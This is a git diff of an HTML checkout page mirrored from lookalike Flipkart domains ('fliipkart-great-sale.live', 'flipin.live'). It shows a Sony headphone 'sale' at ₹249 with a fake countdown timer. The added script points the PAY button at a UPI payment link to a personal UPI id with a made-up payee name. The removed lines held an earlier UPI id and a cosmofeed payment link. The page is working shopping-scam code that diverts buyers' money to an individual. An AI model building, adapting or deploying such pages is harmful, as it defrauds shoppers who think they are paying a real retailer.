@@ -1,10 +1,5 @@
 
-<script>
-
-    const pytm = "upi://pay?pa=rishabh897@paytm&";
-    
-    </script><html class="no-js" lang="en">
-    
+<html class="no-js" lang="en">
     
     
     <!-- Mirrored from fliipkart-great-sale.live/upis4/annap/cart7.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Jun 2023 18:42:18 GMT -->
@@ -554,7 +549,7 @@
     </p>
     <li class="list-group-item" data-timer="2000">
     <div class="flex recommended-product">
-    <img src="../img/wf-ls900-sony-original-imagjzsse8zyyfgf9531.jpg?q=70" />
+    <img src="../../rukminim1.flixcart.com/image/832/832/xif0q/headphone/p/i/4/wf-ls900-sony-original-imagjzsse8zyyfgf9531.jpg?q=70" />
     <div class="description">
     <div class="price flex">
     <span class="bold">&#8377;249</span>
@@ -589,7 +584,7 @@
                         <div class="_1s60nC">
                             <div>Price (1 item)</div>
                             <div class="_38ubMW">
-                                <div class="_3NH1UN">₹249</div>
+                                <div class="_3NH1UN">₹250</div>
                             </div>
                         </div>
                     </div>
@@ -609,7 +604,7 @@
                         <div class="_1s60nC _2t8HQf">
                             <div>Amount Payable</div>
                             <div class="_38ubMW">
-                                <div class="_3NH1UN">₹249</div>
+                                <div class="_3NH1UN">₹250</div>
                             </div>
                         </div>
                     </div>
@@ -623,7 +618,7 @@
     <img src="pdata/safety-label-en-7f5199bc.svg" />
     <div class="button-container flex">
     <a class="common-button"  onclick='myFunction()' id="linkid">
-    PAY 249
+    PAY 250
     </a>
     </div>
     </div>
@@ -656,7 +651,42 @@
     
     <script src="assets/js/main.js"></script>
     <script src="assets/js/shop.html"></script>
+
+    <script>
+        const upiId = "rishabhsisodiya1998@ybl";
+        const pytm = `upi://pay?pa=${upiId}&url=https://flipkaartin.github.io/.com`;
+    
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+    
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+    
+                display.text(minutes + "min " + seconds + "sec");
+    
+                if (--timer < 0) {
+                    timer = duration;
+                }
+            }, 1000);
+        }
+    
+        function myFunction() {
+            if (document.getElementById('radio1').checked) {
+                document.getElementById('linkid').href = `${pytm}&pn=ServiceStation&tn=SONY WF-LS900N Bluetooth Headset&am=249&cu=INR&mode=02&tr`;
+            }
+        }
+    
+        $(document).ready(function () {
+            startTimer(500 - 120, $('#offerend-time'));
+        });
+    </script>
+    
+
     </body>
+
     
     
     
@@ -665,51 +695,10 @@
     <!-- Mirrored from fliipkart-great-sale.live/upis4/annap/cart7.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Jun 2023 18:42:18 GMT -->
     
     <!-- Mirrored from flipin.live/annap/cart7.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Jul 2023 06:14:55 GMT -->
-    </html>   </body>
-    <script>
-    function startTimer(duration, display) {
-    var timer = duration, minutes, seconds;
-    setInterval(function () {
-    minutes = parseInt(timer / 60, 10);
-    seconds = parseInt(timer % 60, 10);
+ 
+    </html> 
     
-    minutes = minutes < 10 ? "0" + minutes : minutes;
-    seconds = seconds < 10 ? "0" + seconds : seconds;
     
-    display.text(minutes + "min " + seconds+ "sec" );
-    
-    if (--timer < 0) {
-        timer = duration;
-    }
-    }, 1000);
-    }
-    </script></body>
-    <script type="text/javascript">
-    $(function() {
-    $('#product-rating').barrating({
-    theme: 'fontawesome-stars'
-    });
-    $('product-rating').barrating('show');
-    $('product-rating').barrating('set', '4');
-    });
-    $( document ).ready(function() {
-    
-    startTimer(500-120, $('#offerend-time'));
-    });
-    </script>
-    <script>
-        function myFunction() {
-    
-            if(document.getElementById('radio1').checked) {
-                document.getElementById('linkid').href = "https://cosmofeed.com/vp/6564725c01fc7d001dce9069";
-            }
-    
-         
-    
-          
-        }
-    </script>
-    </html>
     
     
     
